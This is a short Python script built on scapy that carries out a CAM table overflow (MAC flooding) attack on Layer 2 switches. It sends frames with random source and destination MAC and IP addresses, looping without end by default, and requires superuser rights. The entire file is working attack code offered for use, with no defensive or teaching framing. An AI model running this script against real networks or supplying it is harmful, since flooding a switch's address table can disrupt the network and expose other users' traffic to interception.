#!/usr/bin/env python3
# Description: Perform CAM overflow attack on Layer2 switches
# Depends on:  scapy

import argparse
from scapy.all import *

iface = get_working_if()

parser = argparse.ArgumentParser(add_help=True,
        description="Perform CAM overflow attack on Layer 2 switches")

parser.add_argument('-i', action="store", dest="iface",
        help=f'interface name (default is {iface})',
        default=iface)

parser.add_argument('-c', action="store", dest="count",
        help='count of packets to send (default is unlimited)')

args = parser.parse_args()

if os.getuid() != 0:
    print("Must be superuser.")
    sys.exit(1)

pkt = Ether(src=RandMAC(),dst=RandMAC())/IP(src=RandIP(),dst=RandIP())

if args.iface:
    iface = args.iface

if args.count:
    sendp(pkt, iface=iface, count=int(args.count))
else:
    sendp(pkt, iface=iface, loop=1)

# vim:sw=4:ts=4:sts=4:et:tw=71:cc=72
# End of file.
